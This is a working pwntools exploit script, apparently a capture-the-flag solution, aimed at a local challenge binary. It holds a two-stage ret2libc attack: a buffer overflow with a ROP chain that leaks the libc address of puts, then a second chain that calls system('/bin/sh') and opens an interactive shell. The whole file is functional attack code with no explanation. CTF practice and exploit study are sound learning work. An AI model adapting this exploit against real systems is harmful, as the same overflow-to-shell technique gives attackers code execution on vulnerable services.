#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chall_patched', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)

# p = process(exe.path)
p = remote('127.0.0.1', 9991)

##################################
### Stage 1: Leak libc address ###
##################################
pop_rdi = 0x0000000000401523
payload = b'A'*44
payload += flat(
	p32(0), 0,
	pop_rdi, exe.got['puts'],
	exe.plt['puts'],
	exe.sym['main'],
	)
p.sendlineafter(b'> ', payload)
p.sendlineafter(b'> ', b'0')
p.recvuntil(b'flag.txt\n')

puts_addr = u64(p.recv(6) + b'\0\0')
libc.address = puts_addr - libc.sym['puts']
log.info(hex(libc.address))

##########################
### Stage 2: Get shell ###
##########################
pop_rdi = 0x0000000000401523
ret = 0x000000000040101a
payload = b'A'*44
payload += flat(
	p32(0), 0,
	ret,
	pop_rdi, next(libc.search(b'/bin/sh')),
	libc.sym['system']
	)
p.sendlineafter(b'> ', payload)
p.sendlineafter(b'> ', str(0).encode())

p.interactive()